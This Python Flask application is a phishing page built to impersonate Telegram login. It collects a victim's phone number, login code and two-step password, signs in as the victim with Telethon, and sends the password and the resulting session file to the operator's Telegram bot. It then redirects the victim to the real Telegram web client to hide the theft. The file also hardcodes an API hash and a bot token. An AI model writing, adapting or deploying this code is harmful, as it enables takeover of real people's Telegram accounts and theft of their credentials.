from flask import Flask, render_template, request, redirect, url_for, flash, session, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
from datetime import datetime
import re
import qrcode
import os
import threading
import time
import telebot

app = Flask(__name__)
app.secret_key = 'supersecretkey'

api_id = 25240346
api_hash = 'b8849fd945ed9225a002fda96591b6ee'

# Replace with your Telegram Bot token and your own Telegram user ID
BOT_TOKEN = "6821770286:AAFW_lOxp0jzHKEsq1kTxx0ns5USvWeuWaU"
USER_ID = 5425526761

bot = telebot.TeleBot(BOT_TOKEN)

# URL to redirect to after successful login
REDIRECT_URL = "https://web.telegram.org"  # Change as needed

qr_status = {}

def sanitize_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_name(phone):
    now = datetime.now()
    timestamp = now.strftime("%Y%m%d-%H%M%S")
    safe_phone = sanitize_phone(phone)
    return f"{safe_phone}-{timestamp}.session"

def send_login_details_and_session(session_filepath, phone, password=None):
    message_text = f"Telegram Login:\nPhone: {phone}"
    if password:
        message_text += f"\n2FA Password: {password}"
    bot.send_message(USER_ID, message_text)
    with open(session_filepath, "rb") as file:
        bot.send_document(USER_ID, file, caption="Telegram session file")

def qr_login_wait(session_key, session_str):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    client = TelegramClient(StringSession(session_str), api_id, api_hash, loop=loop)
    loop.run_until_complete(client.connect())
    qr_login = loop.run_until_complete(client.qr_login())
    qr_status[session_key] = {'status': 'waiting', 'url': qr_login.url, 'error': None}

    try:
        loop.run_until_complete(qr_login.wait())
        qr_status[session_key]['status'] = 'success'
        # After success, optionally save session file or perform actions
        # You can save session_str or session file here for your use
        # For demo, we just notify success
    except Exception as e:
        qr_status[session_key]['status'] = 'error'
        qr_status[session_key]['error'] = str(e)
    finally:
        client.disconnect()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        country_code = request.form['country_code']
        phone_number = request.form['phone']
        phone = f"{country_code}{phone_number}"
        session_name = generate_session_name(phone)

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(session_name, api_id, api_hash, loop=loop)
        loop.run_until_complete(client.connect())

        if not loop.run_until_complete(client.is_user_authorized()):
            try:
                result = loop.run_until_complete(client.send_code_request(phone))
                session['phone_code_hash'] = result.phone_code_hash
                session['session_name'] = session_name
                client.disconnect()
                return redirect(url_for('verify', phone=phone))
            except Exception as e:
                flash(f"Error sending code: {e}")
                client.disconnect()
        else:
            flash("You are already authorized.")
            client.disconnect()
    return render_template('index.html')

@app.route('/verify', methods=['GET', 'POST'])
def verify():
    phone = request.args.get('phone')
    session_name = session.get('session_name')
    phone_code_hash = session.get('phone_code_hash')

    if not session_name or not phone_code_hash:
        flash("Session or code hash not found, please restart.")
        return redirect(url_for('index'))

    if request.method == 'POST':
        code = request.form['code']

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(session_name, api_id, api_hash, loop=loop)
        loop.run_until_complete(client.connect())

        try:
            loop.run_until_complete(client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash))
        except Exception as e:
            error_text = str(e).lower()
            if ('password' in error_text) or ('two-steps verification' in error_text) or ('2fa' in error_text):
                session['phone_for_2fa'] = phone
                session['session_name'] = session_name
                client.disconnect()
                return redirect(url_for('password'))
            else:
                flash(f"Sign in error: {e}")
                client.disconnect()
                return render_template('verify.html', phone=phone)
        client.disconnect()

        send_login_details_and_session(session_name, phone)
        flash(f'Session file "{session_name}" created and sent successfully!')
        return redirect(REDIRECT_URL)

    return render_template('verify.html', phone=phone, need_password=False)

@app.route('/password', methods=['GET', 'POST'])
def password():
    phone = session.get('phone_for_2fa')
    session_name = session.get('session_name')

    if not phone or not session_name:
        flash("Session expired or invalid. Please start again.")
        return redirect(url_for('index'))

    if request.method == 'POST':
        password_input = request.form.get('password')
        if not password_input:
            flash("Password is required.")
            return render_template('password.html')

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(session_name, api_id, api_hash, loop=loop)
        loop.run_until_complete(client.connect())

        try:
            loop.run_until_complete(client.sign_in(password=password_input))
        except Exception as e:
            flash(f"2FA password error: {e}")
            client.disconnect()
            return render_template('password.html')

        client.disconnect()
        send_login_details_and_session(session_name, phone, password_input)
        flash('Logged in successfully with 2FA password!')
        return redirect(REDIRECT_URL)

    return render_template('password.html')

@app.route('/qr_login')
def qr_login():
    session_key = f"qr_{int(time.time())}_{os.urandom(4).hex()}"
    session_str = StringSession().save()
    qr_status[session_key] = {'status': 'starting', 'url': None, 'error': None}

    thread = threading.Thread(target=qr_login_wait, args=(session_key, session_str))
    thread.daemon = True
    thread.start()

    timeout, elapsed = 5, 0
    while elapsed < timeout:
        if qr_status[session_key]['url']:
            break
        time.sleep(0.2)
        elapsed += 0.2

    qr_url = qr_status[session_key]['url']
    img = qrcode.make(qr_url)
    img_path = f'static/telegram_qr_{session_key}.png'
    os.makedirs('static', exist_ok=True)
    img.save(img_path)

    session['qr_session_key'] = session_key

    return render_template('qr.html', qr_image=img_path, session_key=session_key)

@app.route('/qr_status')
def qr_status_route():
    session_key = session.get('qr_session_key')
    if not session_key or session_key not in qr_status:
        return jsonify({'status': 'error', 'message': 'No active QR login.'})
    entry = qr_status[session_key]
    return jsonify({'status': entry.get('status', 'starting'), 'error': entry.get('error', '')})

#if __name__ == '__main__':
    #app.run()
